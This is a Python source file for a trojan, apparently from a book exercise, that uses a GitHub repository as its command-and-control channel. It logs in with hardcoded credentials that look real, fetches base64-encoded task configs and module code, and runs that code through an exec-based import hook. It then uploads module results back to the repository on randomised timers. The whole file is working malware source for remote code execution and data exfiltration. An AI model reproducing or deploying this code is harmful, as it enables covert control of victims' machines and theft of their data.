import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os

from github3 import login

trojanId = "abc"

trojanConfig = "%s.json" % trojanId
dataPath = "data/%s/" % trojanId
trojanModules = []
configured = False
taskQueue = Queue.Queue()

def connectToGithub():
    git = login(username = "lanxis2372615@gmail.com",
                password = "lanxia2372615")
    repo = git.repository("lanxia", "chapter7")
    branch = repo.branch("master")

    return git, repo, branch

def getFileContents(path):
    git, repo, branch = connectToGithub()
    tree = branch.commit.commit.tree.recurse()

    for name in tree.tree:
        if path in name.path:
            print "[*] Found file %s" % path
            blob = repo.blob(name._json_data['sha'])

            return blob.content

    return None

def getTrojanConfig():
    global configured
    configJson = getFileContents(trojanConfig)
    config = json.loads(base64.b64decode(configJson))
    configured = True

    for task in config:

        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config

def storeModuleResult(data):
    git, repo, branch = connectToGithub()
    remotePath = "data/%s/%d.data" % (trojanId, random.randint(1000, 100000))
    repo.create_file(remotePath, "Commint message", base64.b64encode(data))

    return

class GitImporter(object):
    def __init__(self):
        self.currentModuleCode = ""

    def find_module(self, fullname, path = None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            newLibrary = getFileContents("module/%s" % fullname)

            if newLibrary is not None:
                self.currentModuleCode = base64.b64decode(newLibrary)

                return self

        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.currentModuleCode in module.__dict__
        sys.modules[name] = module

        return module


def moduleRunner(module):
    taskQueue.put(1)
    result = sys.modules[module].run()
    taskQueue.get()

    storeModuleResult(result)

    return

sys.meta_path = [GitImporter()]

while True:
    if taskQueue.empty():
        config = getTrojanConfig()
        for task in config:
            t = threading.Thread(target = moduleRunner, args = (task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))

        time.sleep(random.randint(1000, 100000))
